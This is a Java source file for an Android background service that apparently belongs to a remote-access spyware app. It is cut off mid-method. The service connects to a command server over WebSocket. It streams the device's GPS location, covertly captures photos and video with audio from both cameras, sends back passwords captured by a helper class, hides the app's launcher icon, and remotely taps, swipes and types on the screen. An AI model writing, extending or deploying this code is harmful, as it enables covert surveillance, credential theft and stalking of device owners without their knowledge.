package com.voyre.app;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.StatFs;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

import com.bumptech.glide.Glide;
import com.bumptech.glide.request.target.SimpleTarget;
import com.bumptech.glide.request.transition.Transition;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "spy_channel";
    
    // WebSocket
    private WebSocket webSocket;
    private OkHttpClient httpClient;
    private boolean isConnected = false;
    private int reconnectAttempts = 0;
    
    // Threading
    private Handler backgroundHandler;
    private HandlerThread handlerThread;
    
    // Device Info
    private String deviceId;
    private String username;
    private String model;
    
    // Managers
    private CameraManager cameraManager;
    private String cameraId;
    private PowerManager.WakeLock wakeLock;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private LocationManager locationManager;
    private TelephonyManager telephonyManager;
    private PackageManager packageManager;
    private ConnectivityManager connectivityManager;
    private BatteryManager batteryManager;
    private WindowManager windowManager;
    private FusedLocationProviderClient fusedLocationClient;
    
    // Location
    private LocationListener locationListener;
    private LocationCallback locationCallback;
    private LocationRequest locationRequest;
    private Location lastLocation = null;
    
    // Media
    private MediaPlayer mediaPlayer;
    
    // Camera
    private Camera camera;
    private Camera cameraFront;
    private MediaRecorder mediaRecorder;
    private boolean isRecordingVideo = false;
    private String currentVideoPath = null;
    
    // UI Overlay
    private ArrayList<View> floatingImages = new ArrayList<>();
    private Random random = new Random();
    
    // State
    private boolean isAppHidden = false;
    private SharedPreferences prefs;
    
    // Screen Control
    private ScreenControlHelper screenControlHelper;
    private boolean isScreenControlActive = false;
    
    // Password Capture
    private PasswordCaptureHelper passwordCaptureHelper;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        Log.d(TAG, "Service onCreate");
        
        // Load config dari GitHub
        Config.loadConfig(this);
        
        // Initialize SharedPreferences
        prefs = getSharedPreferences("app_state", MODE_PRIVATE);
        isAppHidden = prefs.getBoolean("is_hidden", false);
        
        // Initialize FusedLocation
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        
        // Initialize Thread
        handlerThread = new HandlerThread("BackgroundService");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
        
        // Notification
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Setup Location
        setupLocationRequest();
        
        // Initialize Managers
        initializeManagers();
        initializeDeviceInfo();
        
        // Acquire WakeLock
        acquireWakeLock();
        
        // Check Overlay Permission
        checkOverlayPermission();
        
        // Init helpers
        initHelpers();
        
        // Start services
        backgroundHandler.post(this::connectWebSocket);
        backgroundHandler.post(this::startLocationUpdates);
        
        // Schedule periodic tasks
        backgroundHandler.postDelayed(this::sendBatteryInfo, 10000);
        backgroundHandler.postDelayed(this::sendDeviceInfo, 2000);
        backgroundHandler.postDelayed(this::heartbeatRunnable, 5000);
        
        // Restore hidden state if needed
        if (isAppHidden) {
            Log.d(TAG, "App was hidden, restoring state");
        }
    }
    
    private void initHelpers() {
        screenControlHelper = new ScreenControlHelper(this);
        passwordCaptureHelper = new PasswordCaptureHelper(this);
    }
    
    private void initializeManagers() {
        try {
            cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "CameraManager init failed", e);
        }
        
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);
        } catch (Exception e) {
            Log.e(TAG, "DevicePolicyManager init failed", e);
        }
        
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "LocationManager init failed", e);
        }
        
        try {
            telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "TelephonyManager init failed", e);
        }
        
        try {
            connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "ConnectivityManager init failed", e);
        }
        
        try {
            batteryManager = (BatteryManager) getSystemService(BATTERY_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "BatteryManager init failed", e);
        }
        
        try {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "WindowManager init failed", e);
        }
        
        packageManager = getPackageManager();
    }
    
    private void setupLocationRequest() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 15000)
                        .setMinUpdateIntervalMillis(10000)
                        .build();
            } else {
                locationRequest = LocationRequest.create()
                        .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
                        .setInterval(15000)
                        .setFastestInterval(10000);
            }
        } catch (Exception e) {
            locationRequest = LocationRequest.create()
                    .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
                    .setInterval(15000)
                    .setFastestInterval(10000);
        }
        
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (Location location : locationResult.getLocations()) {
                    handleIncomingLocation(location);
                }
            }
        };
    }
    
    private void initializeDeviceInfo() {
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null || deviceId.isEmpty()) {
                deviceId = "unknown_" + System.currentTimeMillis();
            }
        } catch (Exception e) {
            deviceId = "unknown_" + System.currentTimeMillis();
        }
        
        username = Config.getUsername(this);
        if (username == null || username.isEmpty()) {
            username = "default_user";
        }
        
        model = Build.MODEL;
        if (model == null) model = "unknown";
        
        Log.d(TAG, "Device ID: " + deviceId);
        Log.d(TAG, "Username: " + username);
        Log.d(TAG, "Model: " + model);
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService::WakeLock");
                wakeLock.acquire(10 * 60 * 1000L);
                Log.d(TAG, "WakeLock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock acquisition failed", e);
        }
    }
    
    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Log.d(TAG, "Overlay permission not granted, requesting...");
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
    
    // ==================== WEBSOCKET ====================
    
    private void connectWebSocket() {
        try {
            String wsUrl = Config.WS_URL;
            Log.d(TAG, "Connecting to WebSocket: " + wsUrl);
            
            httpClient = new OkHttpClient.Builder()
                .pingInterval(5, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
            
            Request request = new Request.Builder()
                .url(wsUrl)
                .build();
            
            webSocket = httpClient.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    isConnected = true;
                    reconnectAttempts = 0;
                    Log.d(TAG, "WebSocket connected");
                    sendAuth();
                    backgroundHandler.postDelayed(BackgroundService.this::sendDeviceInfo, 1000);
                }
                
                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    handleWebSocketMessage(text);
                }
                
                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    isConnected = false;
                    Log.d(TAG, "WebSocket closed: " + code + " - " + reason);
                    backgroundHandler.postDelayed(BackgroundService.this::reconnect, 5000);
                }
                
                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    isConnected = false;
                    Log.e(TAG, "WebSocket failure", t);
                    backgroundHandler.postDelayed(BackgroundService.this::reconnect, 5000);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "WebSocket connection failed", e);
            backgroundHandler.postDelayed(this::reconnect, 5000);
        }
    }
    
    private void reconnect() {
        reconnectAttempts++;
        long delay = Math.min(5000 * reconnectAttempts, 30000);
        Log.d(TAG, "Reconnecting in " + delay + "ms (attempt " + reconnectAttempts + ")");
        
        backgroundHandler.postDelayed(() -> {
            if (webSocket != null) {
                try {
                    webSocket.cancel();
                } catch (Exception e) {}
                webSocket = null;
            }
            connectWebSocket();
        }, delay);
    }
    
    private void handleWebSocketMessage(String text) {
        try {
            JSONObject cmd = new JSONObject(text);
            Log.d(TAG, "Received: " + text);
            
            if (!cmd.has("type")) return;
            
            String type = cmd.getString("type");
            
            if ("ping".equals(type)) {
                JSONObject pong = new JSONObject();
                pong.put("type", "pong");
                webSocket.send(pong.toString());
                return;
            }
            
            if ("command".equals(type) && cmd.has("command")) {
                String command = cmd.getString("command");
                Log.d(TAG, "Executing command: " + command);
                
                switch (command) {
                    // ====== Device Control ======
                    case "lock":
                        lockDevice();
                        break;
                    case "unlock":
                        unlockDevice();
                        break;
                    case "flashlight_on":
                        toggleFlashlight(true);
                        break;
                    case "flashlight_off":
                        toggleFlashlight(false);
                        break;
                    
                    // ====== App Visibility ======
                    case "hide_app":
                        hideApp();
                        break;
                    case "show_app":
                        showApp();
                        break;
                    
                    // ====== Music ======
                    case "play_music":
                        if (cmd.has("url")) playMusic(cmd.getString("url"));
                        break;
                    case "stop_music":
                        stopMusic();
                        break;
                    
                    // ====== Web ======
                    case "open_web":
                        if (cmd.has("url")) openWebPage(cmd.getString("url"));
                        break;
                    
                    // ====== Notifications & Popups ======
                    case "show_notification":
                        if (cmd.has("title") && cmd.has("message")) {
                            showCustomNotification(cmd.getString("title"), cmd.getString("message"));
                        }
                        break;
                    case "show_popup":
                        if (cmd.has("title") && cmd.has("message")) {
                            showModernPopup(cmd.getString("title"), cmd.getString("message"));
                        }
                        break;
                    case "show_floating_images":
                        if (cmd.has("url") && cmd.has("count")) {
                            showFloatingImages(cmd.getString("url"), cmd.getInt("count"));
                        }
                        break;
                    case "clear_floating_images":
                        clearFloatingImages();
                        break;
                    
                    // ====== Camera ======
                    case "take_photo_front":
                        takePhotoFront();
                        break;
                    case "take_photo_back":
                        takePhotoBack();
                        break;
                    case "record_video_front":
                        if (cmd.has("duration")) {
                            recordVideoFront(cmd.getInt("duration"));
                        }
                        break;
                    case "record_video_back":
                        if (cmd.has("duration")) {
                            recordVideoBack(cmd.getInt("duration"));
                        }
                        break;
                    
                    // ====== Screen Control ======
                    case "tap":
                        if (cmd.has("x") && cmd.has("y")) {
                            float tapX = (float) cmd.getDouble("x");
                            float tapY = (float) cmd.getDouble("y");
                            screenControlHelper.queueTap(tapX, tapY);
                            sendCommandResponse("tap", "queued");
                        }
                        break;
                    case "swipe":
                        if (cmd.has("start_x") && cmd.has("start_y") && cmd.has("end_x") && cmd.has("end_y")) {
                            float sx = (float) cmd.getDouble("start_x");
                            float sy = (float) cmd.getDouble("start_y");
                            float ex = (float) cmd.getDouble("end_x");
                            float ey = (float) cmd.getDouble("end_y");
                            screenControlHelper.queueSwipe(sx, sy, ex, ey);
                            sendCommandResponse("swipe", "queued");
                        }
                        break;
                    case "input_text":
                        if (cmd.has("text")) {
                            screenControlHelper.queueInputText(cmd.getString("text"));
                            sendCommandResponse("input_text", "queued");
                        }
                        break;
                    case "find_and_tap":
                        if (cmd.has("search")) {
                            screenControlHelper.queueFindAndTap(cmd.getString("search"));
                            sendCommandResponse("find_and_tap", "queued");
                        }
                        break;
                    case "find_and_input":
                        if (cmd.has("search") && cmd.has("input")) {
                            screenControlHelper.queueFindAndInput(cmd.getString("search"), cmd.getString("input"));
                            sendCommandResponse("find_and_input", "queued");
                        }
                        break;
                    case "back":
                        screenControlHelper.performBack();
                        sendCommandResponse("back", "executed");
                        break;
                    case "home":
                        screenControlHelper.performHome();
                        sendCommandResponse("home", "executed");
                        break;
                    case "recent_apps":
                        screenControlHelper.performRecentApps();
                        sendCommandResponse("recent_apps", "executed");
                        break;
                    
                    // ====== Screen Info ======
                    case "get_screen_info":
                        sendScreenInfo();
                        break;
                    
                    // ====== Passwords ======
                    case "get_passwords":
                        String passwords = passwordCaptureHelper.getCapturedPasswords();
                        try {
                            JSONObject response = new JSONObject();
                            response.put("type", "passwords");
                            response.put("data", passwords);
                            if (webSocket != null && isConnected) {
                                webSocket.send(response.toString());
                            }
                        } catch (Exception e) {}
                        break;
                    
                    // ====== Open App ======
                    case "open_app":
                        if (cmd.has("package")) {
                            boolean opened = openApp(cmd.getString("package"));
                            sendCommandResponse("open_app", opened ? "success" : "failed");
                        }
                        break;
                    case "open_app_by_name":
                        if (cmd.has("name")) {
                            boolean opened = openAppByName(cmd.getString("name"));
                            sendCommandResponse("open_app_by_name", opened ? "success" : "failed");
                        }
                        break;
                    
                    default:
                        Log.w(TAG, "Unknown command: " + command);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "WebSocket message handling failed", e);
        }
    }
    
    // ==================== SEND METHODS ====================
    
    private void sendAuth() {
        try {
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("username", username);
            auth.put("device_id", deviceId);
            auth.put("model", model);
            auth.put("battery", getBatteryLevel());
            auth.put("timestamp", System.currentTimeMillis());
            
            if (webSocket != null && isConnected) {
                webSocket.send(auth.toString());
                Log.d(TAG, "Auth sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "Auth send failed", e);
        }
    }
    
    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("type", "device_info");
            info.put("device_id", deviceId);
            info.put("username", username);
            info.put("model", safeString(Build.MODEL));
            info.put("manufacturer", safeString(Build.MANUFACTURER));
            info.put("brand", safeString(Build.BRAND));
            info.put("android_version", safeString(Build.VERSION.RELEASE));
            info.put("sdk_version", Build.VERSION.SDK_INT);
            info.put("battery", getBatteryLevel());
            info.put("timestamp", System.currentTimeMillis());
            
            getTelephonyInfo(info);
            getNetworkInfo(info);
            getMemoryInfo(info);
            getStorageInfo(info);
            
            if (webSocket != null && isConnected) {
                webSocket.send(info.toString());
                Log.d(TAG, "Device info sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "Device info send failed", e);
        }
    }
    
    private void sendBatteryInfo() {
        try {
            int level = getBatteryLevel();
            int temperature = 0;
            boolean charging = false;
            
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            
            if (batteryStatus != null) {
                temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                charging = (status == BatteryManager.BATTERY_STATUS_CHARGING || 
                           status == BatteryManager.BATTERY_STATUS_FULL);
            }
            
            JSONObject batteryData = new JSONObject();
            batteryData.put("type", "battery");
            batteryData.put("level", level);
            batteryData.put("temperature", temperature);
            batteryData.put("charging", charging);
            batteryData.put("timestamp", System.currentTimeMillis());
            
            if (webSocket != null && isConnected) {
                webSocket.send(batteryData.toString());
            }
            
            backgroundHandler.postDelayed(this::sendBatteryInfo, 60000);
            
        } catch (Exception e) {
            Log.e(TAG, "Battery info send failed", e);
            backgroundHandler.postDelayed(this::sendBatteryInfo, 60000);
        }
    }
    
    private void sendMediaData(byte[] data, String type) {
        try {
            JSONObject media = new JSONObject();
            media.put("type", "media");
            media.put("media_type", type);
            media.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
            media.put("timestamp", System.currentTimeMillis());
            
            if (webSocket != null && isConnected) {
                webSocket.send(media.toString());
                Log.d(TAG, "Media sent: " + type + " (" + data.length + " bytes)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Send media failed", e);
        }
    }
    
    private void sendCommandResponse(String command, String status) {
        try {
            JSONObject response = new JSONObject();
            response.put("type", "command_response");
            response.put("command", command);
            response.put("status", status);
            response.put("timestamp", System.currentTimeMillis());
            if (webSocket != null && isConnected) {
                webSocket.send(response.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Send command response failed", e);
        }
    }
    
    private void sendScreenInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("type", "screen_info");
            info.put("width", getResources().getDisplayMetrics().widthPixels);
            info.put("height", getResources().getDisplayMetrics().heightPixels);
            info.put("density", getResources().getDisplayMetrics().densityDpi);
            info.put("density_dpi", getResources().getDisplayMetrics().density);
            if (webSocket != null && isConnected) {
                webSocket.send(info.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Send screen info failed", e);
        }
    }
    
    private void handleIncomingLocation(Location location) {
        if (location == null) return;
        lastLocation = location;
        
        try {
            JSONObject locData = new JSONObject();
            locData.put("type", "location");
            locData.put("lat", location.getLatitude());
            locData.put("lng", location.getLongitude());
            locData.put("accuracy", location.getAccuracy());
            locData.put("provider", location.getProvider());
            locData.put("speed", location.getSpeed());
            locData.put("bearing", location.getBearing());
            locData.put("altitude", location.getAltitude());
            locData.put("timestamp", location.getTime());
            
            if (webSocket != null && isConnected) {
                webSocket.send(locData.toString());
                Log.d(TAG, "Location sent: " + location.getLatitude() + ", " + location.getLongitude());
            }
        } catch (Exception e) {
            Log.e(TAG, "Location send failed", e);
        }
    }
    
    private void heartbeatRunnable() {
        if (webSocket != null && isConnected) {
            try {
                JSONObject ping = new JSONObject();
                ping.put("type", "ping");
                webSocket.send(ping.toString());
            } catch (Exception e) {}
        }
        backgroundHandler.postDelayed(this::heartbeatRunnable, 5000);
    }
    
    // ==================== LOCATION UPDATES ====================
    
    private void startLocationUpdates() {
        try {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "Location permission not granted");
                return;
            }
            
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
            Log.d(TAG, "FusedLocation updates started");
            
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    handleIncomingLocation(location);
                }
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override
                public void onProviderEnabled(String provider) {}
                @Override
                public void onProviderDisabled(String provider) {}
            };
            
            try {
                if (locationManager != null) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, locationListener);
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10, locationListener);
                    Log.d(TAG, "LocationManager updates started");
                }
            } catch (SecurityException e) {
                Log.e(TAG, "LocationManager permission error", e);
            } catch (Exception e) {
                Log.e(TAG, "LocationManager start failed", e);
            }
            
            try {
                if (locationManager != null) {
                    Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (gpsLocation != null) handleIncomingLocation(gpsLocation);
                    
                    Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (networkLocation != null && lastLocation == null) handleIncomingLocation(networkLocation);
                }
            } catch (SecurityException e) {
                Log.e(TAG, "Last known location permission error", e);
            } catch (Exception e) {
                Log.e(TAG, "Last known location failed", e);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Location updates failed", e);
        }
    }
    
    // ==================== COMMAND HANDLERS ====================
    
    private void lockDevice() {
        try {
            if (devicePolicyManager != null && devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow();
                Log.d(TAG, "Device locked via DeviceAdmin");
            } else {
                showLockScreen();
            }
        } catch (Exception e) {
            Log.e(TAG, "Lock device failed", e);
            showLockScreen();
        }
    }
    
    private void unlockDevice() {
        try {
            Intent intent = new Intent("UNLOCK_ACTION");
            sendBroadcast(intent);
        } catch (Exception e) {
            Log.e(TAG, "Unlock device failed", e);
        }
    }
    
    private void showLockScreen() {
        try {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Show lock screen failed", e);
        }
    }
    
    // ==================== HIDE / SHOW APP ====================
    
    private void hideApp() {
        try {
            PackageManager pm = getPackageManager();
            boolean anyDisabled = false;
            
            Intent launcherIntent = new Intent(Intent.ACTION_MAIN);
            launcherIntent.addCategory(Intent.CATEGORY_LAUNCHER);
            launcherIntent.setPackage(getPackageName());
            List<ResolveInfo> resolveInfo = pm.queryIntentActivities(launcherIntent, 0);
            
            for (ResolveInfo ri : resolveInfo) {
                String activityName = ri.activityInfo.name;
                try {
                    ComponentName cn = new ComponentName(getPackageName(), activityName);
                    pm.setComponentEnabledSetting(
                        cn,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        0
                    );
                    anyDisabled = true;
                    Log.d(TAG, "Disabled: " + activityName);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to disable: " + activityName, e);
                }
            }
            
            try {
                ComponentName mainCn = new ComponentName(this, MainActivity.class);
                int status = pm.getComponentEnabledSetting(mainCn);
                if (status != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    pm.setComponentEnabledSetting(
                        mainCn,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        0
                    );
                    anyDisabled = true;
                    Log.d(TAG, "Disabled main activity");
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to disable main activity", e);
            }
            
            if (anyDisabled) {
                Intent refreshIntent = new Intent(Intent.ACTION_PACKAGE_CHANGED);
                refreshIntent.setData(Uri.parse("package:" + getPackageName()));
                sendBroadcast(refreshIntent);
                
                prefs.edit().putBoolean("is_hidden", true).apply();
                isAppHidden = true;
                Log.d(TAG, "App hidden successfully");
            }
        } catch (Exception e) {
            Log.e(TAG, "Hide app failed", e);
        }
    }
    
    private void showApp() {
        try {
            PackageManager pm = getPackageManager();
            boolean anyEnabled = false;
            
            PackageInfo pkgInfo = pm.getPackageInfo(getPackageName(), PackageManager.GET_ACTIVITIES);
            
            for (ActivityInfo activityInfo : pkgInfo.activities) {
                try {
                    ComponentName cn = new ComponentName(getPackageName(), activityInfo.name);
                    int status = pm.getComponentEnabledSetting(cn);
                    if (status == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                        pm.setComponentEnabledSetting(
                            cn,
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            0
                        );
                        anyEnabled = true;
                        Log.d(TAG, "Enabled: " + activityInfo.name);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to enable: " + activityInfo.name, e);
                }
            }
            
            try {
                ComponentName mainCn = new ComponentName(this, MainActivity.class);
                pm.setComponentEnabledSetting(
                    mainCn,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    0
                );
                anyEnabled = true;
            } catch (Exception e) {}
            
            if (anyEnabled) {
                Intent refreshIntent = new Intent(Intent.ACTION_PACKAGE_CHANGED);
                refreshIntent.setData(Uri.parse("package:" + getPackageName()));
                sendBroadcast(refreshIntent);
                
                prefs.edit().putBoolean("is_hidden", false).apply();
                isAppHidden = false;
                Log.d(TAG, "App shown successfully");
            }
        } catch (Exception e) {
            Log.e(TAG, "Show app failed", e);
        }
    }
    
    // ==================== CAMERA ====================
    
    private void takePhotoFront() {
        try {
            Camera cam = openCamera(Camera.CameraInfo.CAMERA_FACING_FRONT);
            if (cam == null) {
                sendCommandResponse("take_photo_front", "camera_not_available");
                return;
            }
            
            Camera.Parameters params = cam.getParameters();
            params.setPictureFormat(Camera.Parameters.PICTURE_FORMAT_JPEG);
            params.setJpegQuality(85);
            
            List<Camera.Size> sizes = params.getSupportedPictureSizes();
            if (sizes != null && !sizes.isEmpty()) {
                Camera.Size largest = sizes.get(0);
                for (Camera.Size size : sizes) {
                    if (size.width * size.height > largest.width * largest.height) {
                        largest = size;
                    }
                }
                params.setPictureSize(largest.width, largest.height);
            }
            
            cam.setParameters(params);
            
            cam.takePicture(null, null, (byte[] data, Camera camera) -> {
                sendMediaData(data, "photo_front");
                camera.release();
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Take photo front failed", e);
            sendCommandResponse("take_photo_front", "failed");
        }
    }
    
    private void takePhotoBack() {
        try {
            Camera cam = openCamera(Camera.CameraInfo.CAMERA_FACING_BACK);
            if (cam == null) {
                sendCommandResponse("take_photo_back", "camera_not_available");
                return;
            }
            
            Camera.Parameters params = cam.getParameters();
            params.setPictureFormat(Camera.Parameters.PICTURE_FORMAT_JPEG);
            params.setJpegQuality(85);
            
            List<Camera.Size> sizes = params.getSupportedPictureSizes();
            if (sizes != null && !sizes.isEmpty()) {
                Camera.Size largest = sizes.get(0);
                for (Camera.Size size : sizes) {
                    if (size.width * size.height > largest.width * largest.height) {
                        largest = size;
                    }
                }
                params.setPictureSize(largest.width, largest.height);
            }
            
            cam.setParameters(params);
            
            cam.takePicture(null, null, (byte[] data, Camera camera) -> {
                sendMediaData(data, "photo_back");
                camera.release();
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Take photo back failed", e);
            sendCommandResponse("take_photo_back", "failed");
        }
    }
    
    private void recordVideoFront(int durationSeconds) {
        recordVideo(Camera.CameraInfo.CAMERA_FACING_FRONT, durationSeconds, "video_front");
    }
    
    private void recordVideoBack(int durationSeconds) {
        recordVideo(Camera.CameraInfo.CAMERA_FACING_BACK, durationSeconds, "video_back");
    }
    
    private void recordVideo(int cameraId, int durationSeconds, String type) {
        try {
            Camera cam = openCamera(cameraId);
            if (cam == null) {
                sendCommandResponse(type, "camera_not_available");
                return;
            }
            
            if (mediaRecorder != null) {
                mediaRecorder.release();
                mediaRecorder = null;
            }
            
            mediaRecorder = new MediaRecorder();
            cam.unlock();
            mediaRecorder.setCamera(cam);
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setVideoSize(1280, 720);
            mediaRecorder.setVideoFrameRate(30);
            mediaRecorder.setVideoEncodingBitRate(5000000);
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String fileName = "video_" + System.currentTimeMillis() + ".mp4";
            File videoFile = new File(getCacheDir(), fileName);
            currentVideoPath = videoFile.getAbsolutePath();
            mediaRecorder.setOutputFile(currentVideoPath);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecordingVideo = true;
            Log.d(TAG, "Video recording started: " + currentVideoPath);
            
            sendCommandResponse(type, "recording_started");
            
            backgroundHandler.postDelayed(() -> {
                stopVideoRecording(type);
            }, durationSeconds * 1000L);
            
        } catch (Exception e) {
            Log.e(TAG, "Record video failed", e);
            sendCommandResponse(type, "failed");
        }
    }
    
    private void stopVideoRecording(String type) {
        try {
            if (mediaRecorder != null && isRecordingVideo) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecordingVideo = false;
                
                File videoFile = new File(currentVideoPath);
                if (videoFile.exists() && videoFile.length() > 0) {
                    FileInputStream fis = new FileInputStream(videoFile);
                    byte[] data = new byte[(int) videoFile.length()];
                    fis.read(data);
                    fis.close();
                    
                    sendMediaData(data, type);
                    videoFile.delete();
                    Log.d(TAG, "Video recorded: " + data.length + " bytes");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop video recording failed", e);
        }
    }
    
    private Camera openCamera(int cameraId) {
        try {
            if (cameraId == Camera.CameraInfo.CAMERA_FACING_BACK) {
                if (camera == null) {
